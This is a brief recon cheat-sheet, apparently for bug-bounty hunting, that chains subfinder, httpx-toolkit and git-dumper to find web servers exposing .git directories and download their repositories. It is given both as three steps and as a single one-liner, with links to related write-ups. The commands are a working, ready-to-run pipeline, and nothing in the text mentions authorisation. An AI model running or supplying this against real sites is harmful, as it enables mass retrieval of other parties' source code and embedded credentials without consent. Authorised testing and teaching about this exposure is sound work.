# How to Hunt for Exposed .git Dorectories

```bash
echo example.com | subfinder -all -o subs.txt

cat subs.txt | httpx-toolkit -path /.git/HEAD -silent -mr "refs/heads" -rl 500 | tee git.txt

cat git.txt | cut -d '/' -f1,2,3,4 | while read url; do git-dumper $url git-dumper/$url; done


```

One Liner
```bash
echo example.com | subfinder -all | httpx-toolkit -path /.git/HEAD -silent -mr "refs/heads" -rl 500 | cut -d '/' -f1,2,3,4 | while read url; do git-dumper $url git-dumper/$url; done
```

Resources
- (Web security - exposed .git folder in production)[https://medium.com/smallcase-engineering/web-security-exposed-git-folder-in-production-51ad9484dee0]
- (Git Exposed - How to Identify and Exploit)[https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37]
- (Red Book - Exposed Git Repositories)[https://github.com/v4resk/red-book/blob/main/web/web-vulnerabilities/server-side/exposed-git-repositories.md]
